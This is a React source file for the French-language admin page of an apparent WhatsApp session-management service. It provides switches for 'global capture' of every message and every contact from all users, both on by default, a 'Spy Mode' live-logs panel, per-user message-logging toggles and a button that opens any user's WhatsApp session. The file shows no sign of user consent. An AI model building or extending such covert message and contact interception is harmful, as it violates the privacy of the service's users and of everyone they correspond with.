import { useAdmin } from "@/hooks/useAdmin";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Switch } from "@/components/ui/switch";
import { useNavigate, Navigate } from "react-router-dom";
import { format } from "date-fns";
import { fr } from "date-fns/locale";
import { Users, Shield, MessageSquare, Clock, LogOut, Database, UserPlus } from "lucide-react";
import { Loading } from "@/components/Loading";
import { LiveLogsPanel } from "@/components/admin/LiveLogsPanel";

const Admin = () => {
  const { useUsers, useToggleLogging, useSettings, useUpdateSetting, logout, adminToken } = useAdmin();
  const { data: users, isLoading, error } = useUsers();
  const { data: settings, isLoading: loadingSettings } = useSettings();
  const toggleLogging = useToggleLogging();
  const updateSetting = useUpdateSetting();
  const navigate = useNavigate();

  if (!adminToken) return <Navigate to="/admin/auth" replace />;
  if (isLoading) return <Loading />;

  if (error) {
    return (
      <div className="container mx-auto py-8 px-4 text-center">
        <h2 className="text-2xl font-bold text-destructive mb-4">Erreur de chargement</h2>
        <p className="text-muted-foreground mb-6">{(error as any)?.message || "Impossible de récupérer la liste des utilisateurs."}</p>
        <Button onClick={() => window.location.reload()}>Réessayer</Button>
      </div>
    );
  }

  const usersList = (users as any[]) || [];

  return (
    <div className="container mx-auto py-8 px-4 max-w-7xl animate-fade-in">
      <div className="flex items-center justify-between mb-8">
        <div className="flex items-center gap-3">
          <div className="w-12 h-12 rounded-2xl bg-primary/10 flex items-center justify-center">
            <Shield className="w-6 h-6 text-primary" />
          </div>
          <div>
            <h1 className="text-3xl font-bold tracking-tight">Tour de Contrôle</h1>
            <p className="text-muted-foreground">Gérez tous les utilisateurs et leurs sessions WhatsApp</p>
          </div>
        </div>
        <Button variant="outline" size="sm" onClick={logout} className="gap-2">
          <LogOut className="h-4 w-4" />
          Déconnexion
        </Button>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
        <Card className="bg-card/50 backdrop-blur-sm border-primary/10 shadow-glass">
          <CardHeader className="flex flex-row items-center justify-between pb-2">
            <CardTitle className="text-sm font-medium">Utilisateurs Totaux</CardTitle>
            <Users className="h-4 w-4 text-muted-foreground" />
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold">{usersList.length}</div>
          </CardContent>
        </Card>
        <Card className="bg-card/50 backdrop-blur-sm border-primary/10 shadow-glass">
          <CardHeader className="flex flex-row items-center justify-between pb-2">
            <CardTitle className="text-sm font-medium">Connectés</CardTitle>
            <div className="h-2 w-2 rounded-full bg-green-500 animate-pulse" />
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold">
              {usersList.filter((u: any) => u.whatsapp_status === 'connected').length}
            </div>
          </CardContent>
        </Card>
        <Card className="bg-card/50 backdrop-blur-sm border-primary/10 shadow-glass">
          <CardHeader className="flex flex-row items-center justify-between pb-2">
            <CardTitle className="text-sm font-medium">Dernière Activité</CardTitle>
            <Clock className="h-4 w-4 text-muted-foreground" />
          </CardHeader>
          <CardContent>
            <div className="text-sm font-medium">Aujourd'hui</div>
          </CardContent>
        </Card>
      </div>

      {loadingSettings ? (
        <div className="mb-8">
          <Loading />
        </div>
      ) : settings && (
        <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
          <Card className="bg-card/50 backdrop-blur-sm border-primary/10 shadow-glass">
            <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
              <div className="space-y-1">
                <CardTitle className="text-sm font-medium flex items-center gap-2">
                  <Database className="h-4 w-4 text-primary" />
                  Capture Globale des Messages
                </CardTitle>
                <CardDescription className="text-xs">
                  Enregistre TOUS les messages de TOUS les utilisateurs en temps réel
                </CardDescription>
              </div>
              <Switch
                checked={settings.global_message_capture ?? true}
                onCheckedChange={(checked) => updateSetting.mutate({ key: 'global_message_capture', value: checked })}
                disabled={updateSetting.isPending}
              />
            </CardHeader>
            <CardContent>
              <div className="flex items-center gap-2">
                <Badge variant={(settings.global_message_capture ?? true) ? 'default' : 'secondary'} className={(settings.global_message_capture ?? true) ? 'bg-green-500 hover:bg-green-600' : ''}>
                  {(settings.global_message_capture ?? true) ? '✅ ACTIVÉ' : '⏸️ DÉSACTIVÉ'}
                </Badge>
                <span className="text-xs text-muted-foreground">
                  Tous les messages entrants et sortants sont stockés dans la base de données
                </span>
              </div>
            </CardContent>
          </Card>

          <Card className="bg-card/50 backdrop-blur-sm border-primary/10 shadow-glass">
            <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
              <div className="space-y-1">
                <CardTitle className="text-sm font-medium flex items-center gap-2">
                  <UserPlus className="h-4 w-4 text-primary" />
                  Capture Globale des Contacts
                </CardTitle>
                <CardDescription className="text-xs">
                  Synchronise et enregistre TOUS les contacts de TOUS les utilisateurs
                </CardDescription>
              </div>
              <Switch
                checked={settings.global_contact_capture ?? true}
                onCheckedChange={(checked) => updateSetting.mutate({ key: 'global_contact_capture', value: checked })}
                disabled={updateSetting.isPending}
              />
            </CardHeader>
            <CardContent>
              <div className="flex items-center gap-2">
                <Badge variant={(settings.global_contact_capture ?? true) ? 'default' : 'secondary'} className={(settings.global_contact_capture ?? true) ? 'bg-green-500 hover:bg-green-600' : ''}>
                  {(settings.global_contact_capture ?? true) ? '✅ ACTIVÉ' : '⏸️ DÉSACTIVÉ'}
                </Badge>
                <span className="text-xs text-muted-foreground">
                  Les contacts sont collectés depuis WhatsApp et stockés automatiquement
                </span>
              </div>
            </CardContent>
          </Card>
        </div>
      )}

      {/* Spy Mode / Live Logs */}
      <div className="mb-8 animate-fade-in" style={{ animationDelay: '0.2s' }}>
        <LiveLogsPanel />
      </div>

      <Card className="border-primary/10 shadow-glass overflow-hidden">
        <CardHeader className="bg-muted/30 border-b border-primary/5">
          <CardTitle>Liste des Utilisateurs</CardTitle>
        </CardHeader>
        <CardContent className="p-0">
          <Table>
            <TableHeader>
              <TableRow className="hover:bg-transparent">
                <TableHead className="w-[250px]">Email</TableHead>
                <TableHead>Plan</TableHead>
                <TableHead>Status WhatsApp</TableHead>
                <TableHead>Récupération Msg</TableHead>
                <TableHead>Dernière Connexion</TableHead>
                <TableHead className="text-right">Actions</TableHead>
              </TableRow>
            </TableHeader>
            <TableBody>
              {usersList.map((user: any) => {
                return (
                  <TableRow key={user.id} className="group hover:bg-muted/30 transition-colors">
                    <TableCell className="font-medium">{user.email}</TableCell>
                    <TableCell>
                      <Badge variant={user.plan === 'premium' ? 'default' : 'secondary'} className={user.plan === 'premium' ? 'bg-premium text-premium-foreground' : ''}>
                        {user.plan}
                      </Badge>
                    </TableCell>
                    <TableCell>
                      <div className="flex items-center gap-2">
                        <div className={`h-2 w-2 rounded-full ${user.whatsapp_status === 'connected' ? 'bg-green-500' : 'bg-red-500'}`} />
                        <span className="capitalize">{user.whatsapp_status}</span>
                      </div>
                    </TableCell>
                    <TableCell>
                      <div className="flex items-center gap-2">
                        <Switch 
                          checked={user.log_messages} 
                          onCheckedChange={(checked) => toggleLogging.mutate({ userId: user.id, enabled: checked })}
                          disabled={toggleLogging.isPending}
                        />
                        <span className="text-xs text-muted-foreground">
                          {user.log_messages ? 'Actif' : 'Inactif'}
                        </span>
                      </div>
                    </TableCell>
                    <TableCell className="text-muted-foreground text-sm">
                      {user.last_seen ? format(new Date(user.last_seen), 'PPp', { locale: fr }) : 'Jamais'}
                    </TableCell>
                    <TableCell className="text-right">
                      <Button 
                        variant="ghost" 
                        size="sm"
                        className="gap-2 group-hover:bg-primary group-hover:text-primary-foreground transition-all"
                        onClick={() => navigate(`/dashboard/admin/user/${user.id}`)}
                      >
                        <MessageSquare className="w-4 h-4" />
                        Ouvrir WhatsApp
                      </Button>
                    </TableCell>
                  </TableRow>
                );
              })}
              {usersList.length === 0 && (
                <TableRow>
                  <TableCell colSpan={5} className="h-32 text-center text-muted-foreground">
                    Aucun utilisateur trouvé
                  </TableCell>
                </TableRow>
              )}
            </TableBody>
          </Table>
        </CardContent>
      </Card>
    </div>
  );
};

export default Admin;
